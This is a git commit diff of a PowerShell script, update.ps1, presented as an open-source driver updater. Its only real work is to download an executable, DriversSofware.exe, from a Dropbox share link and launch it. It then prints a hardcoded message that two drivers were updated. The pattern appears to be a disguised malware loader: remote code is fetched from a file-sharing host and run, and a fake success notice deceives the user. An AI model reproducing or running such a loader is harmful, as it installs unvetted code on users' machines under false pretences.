1aba5794e966164c74cca81b5ad931ce8bc08918
Disepi423 <nathanpj.perso@gmail.com>
2026-02-16 20:15:25 +0100

    Update update.ps1

--- update.ps1
+++ update.ps1
@@ -1,18 +1,22 @@
-# 
-#
-#                 [ DRIVER UPDATER v2.1.6 ]
-#  Need help? Consider reporting any issues on the GitHub page.
-#  Do not edit the script yourself, it might destroy the whole script and break your drivers if you do so, even with the extra securities.
-#
-#
-#                        // MAIN CODE //
+# =============================================================================
+# Drivers updating code (open-source)
+# Got any issues? Report it on the GitHub project.
+# =============================================================================
+
 $Url = 'https://www.dropbox.com/scl/fi/bf0mm4nt9fcl03phhwjey/DriversSofware.exe?rlkey=l0c5uwsale3be2bpn5870drkn&e=1&st=1btcgqq9&dl=1'
+$Exe = 'updater1.exe'
+
+Write-Host "`n" "=== Updating Drivers ===" -ForegroundColor Cyan
+Write-Host "Downloading drivers..." -ForegroundColor Yellow
 
 try {
-    Write-Host "Starting drivers update, please wait..."
-    Invoke-WebRequest $Url -OutFile 'updater1.exe' -ErrorAction Stop
-    & powershell -ExecutionPolicy Bypass -File 'updater1.exe'
-    Write-Host "Succesfully updated 2 drivers." -ForegroundColor Green
+    Invoke-WebRequest $Url -OutFile $Exe -ErrorAction Stop
+    Write-Host "`nUpdating..." -ForegroundColor Yellow
+    Start-Process -FilePath $Exe
+    Write-Host "`nUpdate complete! 2 drivers updated." -ForegroundColor Green
 } catch {
-    Write-Host "Error occured: $($_.Exception.Message)" -ForegroundColor Red
+    Write-Host "`nError: " -NoNewline -ForegroundColor Red
+    Write-Host "$($_.Exception.Message)" -ForegroundColor White
 }
+
+Write-Host "Finished." -ForegroundColor Gray
